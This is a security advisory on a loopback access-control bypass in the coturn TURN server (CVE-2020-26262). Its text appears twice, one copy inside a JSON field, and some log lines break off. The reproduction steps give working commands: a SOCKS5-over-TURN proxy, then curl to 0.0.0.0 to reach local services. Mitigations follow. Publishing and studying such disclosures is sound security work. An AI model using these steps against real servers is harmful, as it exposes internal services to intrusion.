However, it was observed that when sending a `CONNECT` request with the `XOR-PEER-ADDRESS` value of `0.0.0.0`, a successful response was received and subsequently, `CONNECTIONBIND` also received a successful response. Coturn then was able to relay packets to local network services.\n\nAdditionally, when coturn was listening on IPv6, which is the default setting, local services could also be reached by making use of either `[::1]` or `[::]` as the peer address.\n\n## Impact\n\nBy using the address `0.0.0.0` as the peer address, a malicious user will be able to relay packets to the loopback interface, unless `--denied-peer-ip=0.0.0.0` (or similar) has been specified. Since the default configuration implies that loopback peers are not allowed, coturn administrators may choose to not set the `denied-peer-ip` setting. Similar implications apply to the IPv6 equivalent of `[::1]` and `[::]`.\n\n## How we reproduced the issue\n\n1. Run coturn using the following command:\n\n       turnserver -v --user=username1:password1\n1. Run our internal tool `stunner`, acting as a socks5 proxy which uses TURN.\n\n       stunner turn peer proxy socks5 tcp://172.17.0.2:3478 \\\n           --local-bind 0.0.0.0:9999 -u username1:password1\n1. Run a cURL command to connect to `127.0.0.1:80`.\n\n       curl -x socks5h://127.0.0.1:9999 http://127.0.0.1\n1. The following log was observed, confirming that `127.0.0.1` is being blocked:\n\n       725: IPv4. tcp or tls connected to: 172.17.0.1:36504\n       725: session 011000000000000001: realm <172.17.0.2> user <>: \n           incoming packet message processed, error 401: Unauthorized\n       725: IPv4.

Run a cURL command to connect to `0.0.0.0:80`.\n\n       curl -x socks5h://127.0.0.1:9999 http://0.0.0.0\n1. The following log was observed, confirming that the loopback protection has been bypassed:\n\n       1010: IPv4. tcp or tls connected to: 172.17.0.1:37240\n       1010: session 005000000000000001: realm <172.17.0.2> user <>: \n           incoming packet message processed, error 401: Unauthorized\n       1010: IPv4.

The following is an example configuration that prevents access to `0.0.0.0`:\n\n```\ndenied-peer-ip=0.0.0.0-0.255.255.255\n```\n\nAdditionally, as a mitigation step when the patch cannot yet be applied, we recommend disabling IPv6 if not required by listening on an IPv4 IP address. See our blog post for an [explanation][1] for this recommendation.\n\n[1]: https://www.rtcsec.com/post/2021/01/details-about-cve-2020-26262-bypass-of-coturns-default-access-control-protection/#faq\n\nEnable Security would like to thank Mészáros Mihály and the developers at Coturn for the very quick response and fixing this security issue.\n\n\n## About Enable Security\n\n[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.\n\n## Disclaimer\n\nThe information in the advisory is believed to be accurate at the time of publishing based on currently available information.

								"thetext": "# Loopback access control bypass in coturn by using 0.0.0.0, [::1] or [::] as the peer address\n\n- Fixed version: 4.5.2\n- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-01-coturn-access-control-bypass\n- Coturn Security Advisory: https://github.com/coturn/coturn/security/advisories/GHSA-6g6j-r9rf-cm7p\n- Other references:\n    - CVE-2020-26262\n    - https://www.rtcsec.com/post/2021/01/details-about-cve-2020-26262-bypass-of-coturns-default-access-control-protection/\n- Tested vulnerable versions: 4.5.1.x\n- Timeline:\n    - Report date: 2020-11-20\n    - Issue confirmed by coturn developers: 2020-11-23\n    - Security patch provided by Enable Security: 2020-11-30\n    - Refactoring by coturn developers: 2020-12-07 to 2020-12-10\n    - Joint Enable Security and Coturn project advisory publication: 2021-01-11\n\n## Description\n\nBy default coturn does not allow peers to connect and relay packets to loopback addresses in the range of `127.x.x.x`. However, it was observed that when sending a `CONNECT` request with the `XOR-PEER-ADDRESS` value of `0.0.0.0`, a successful response was received and subsequently, `CONNECTIONBIND` also received a successful response. Coturn then was able to relay packets to local network services.\n\nAdditionally, when coturn was listening on IPv6, which is the default setting, local services could also be reached by making use of either `[::1]` or `[::]` as the peer address.\n\n## Impact\n\nBy using the address `0.0.0.0` as the peer address, a malicious user will be able to relay packets to the loopback interface, unless `--denied-peer-ip=0.0.0.0` (or similar) has been specified. Since the default configuration implies that loopback peers are not allowed, coturn administrators may choose to not set the `denied-peer-ip` setting. Similar implications apply to the IPv6 equivalent of `[::1]` and `[::]`.\n\n## How we reproduced the issue\n\n1. Run coturn using the following command:\n\n       turnserver -v --user=username1:password1\n1. Run our internal tool `stunner`, acting as a socks5 proxy which uses TURN.\n\n       stunner turn peer proxy socks5 tcp://172.17.0.2:3478 \\\n           --local-bind 0.0.0.0:9999 -u username1:password1\n1. Run a cURL command to connect to `127.0.0.1:80`.\n\n       curl -x socks5h://127.0.0.1:9999 http://127.0.0.1\n1. The following log was observed, confirming that `127.0.0.1` is being blocked:\n\n       725: IPv4. tcp or tls connected to: 172.17.0.1:36504\n       725: session 011000000000000001: realm <172.17.0.2> user <>: \n           incoming packet message processed, error 401: Unauthorized\n       725: IPv4.

Run a cURL command to connect to `0.0.0.0:80`.\n\n       curl -x socks5h://127.0.0.1:9999 http://0.0.0.0\n1. The following log was observed, confirming that the loopback protection has been bypassed:\n\n       1010: IPv4. tcp or tls connected to: 172.17.0.1:37240\n       1010: session 005000000000000001: realm <172.17.0.2> user <>: \n           incoming packet message processed, error 401: Unauthorized\n       1010: IPv4.

The following is an example configuration that prevents access to `0.0.0.0`:\n\n```\ndenied-peer-ip=0.0.0.0-0.255.255.255\n```\n\nAdditionally, as a mitigation step when the patch cannot yet be applied, we recommend disabling IPv6 if not required by listening on an IPv4 IP address. See our blog post for an [explanation][1] for this recommendation.\n\n[1]: https://www.rtcsec.com/post/2021/01/details-about-cve-2020-26262-bypass-of-coturns-default-access-control-protection/#faq\n\nEnable Security would like to thank Mészáros Mihály and the developers at Coturn for the very quick response and fixing this security issue.\n\n\n## About Enable Security\n\n[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.\n\n## Disclaimer\n\nThe information in the advisory is believed to be accurate at the time of publishing based on currently available information.
